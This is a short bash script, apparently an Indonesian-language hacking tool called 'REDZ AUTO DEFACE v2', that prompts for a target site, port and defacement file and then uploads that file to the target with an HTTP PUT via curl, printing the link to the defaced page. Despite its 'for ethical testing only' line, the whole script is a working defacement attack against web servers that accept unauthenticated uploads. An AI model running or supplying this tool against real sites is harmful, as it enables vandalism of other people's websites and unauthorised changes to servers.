#!/bin/bash

# REDZ AUTO DEFACE v2 - For Ethical Testing Only

clear
echo "==[ REDZ AUTO DEFACE ]=="
read -p "🔗 Target (http://target.com): " target
read -p "📍 Port (80 default): " port
read -p "📄 Nama file deface (html/jso): " file

# Cek file deface ada atau nggak
if [ ! -f "$file" ]; then
  echo "[!] File $file tidak ditemukan!"
  exit 1
fi

# Tambahkan port ke URL kalau bukan 80
if [[ "$port" != "80" ]]; then
  target="$target:$port"
fi

# Upload file pakai curl (PUT method)
echo "[*] Mengupload $file ke $target ..."
curl -T "$file" "$target/$file" --max-time 10

# Output link deface
echo "[✔] Cek hasil di: $target/$file"
